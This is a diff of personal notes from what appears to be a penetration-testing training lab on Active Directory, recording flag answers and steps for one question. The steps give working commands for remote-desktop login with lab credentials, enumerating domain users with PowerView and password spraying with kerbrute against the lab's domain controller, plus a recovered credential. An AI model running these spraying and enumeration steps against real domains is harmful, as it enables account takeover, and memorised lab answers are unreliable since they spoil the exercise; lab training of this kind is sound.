@@ -40,7 +40,9 @@ Question 3 -  Submit the contents of the C:\flag.txt file on MS01. - aud1t_gr0up
 Question 4 - Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain. - BRO86
 1) run net accounts ON EVIL WINRM session
 2) we see theres no lockout threshold so we can brute force yo. 
-3) xfreerdp on AB920 so we can use powershell and import-module PowerView
+scp powerview and kerbrute to htb-student ssh shell 
+3) xfreerdp on AB920 so we can use powershell and import-module PowerView -> xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal +clipboard /dynamic-resolution /drive:shared,/home/htb-student/Desktop
+
 4) once PwoerView.ps1 is imported run -> Get-DomainUser | Select-Object samaccountname > adusers.txt
 5) then we can run passwordspray with kerberute -> kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 adusers.txt pass.txt (any top 10000 password list will work) 
 6) VALID LOGIN:  BR086@inlanefreight.local:Welcome1
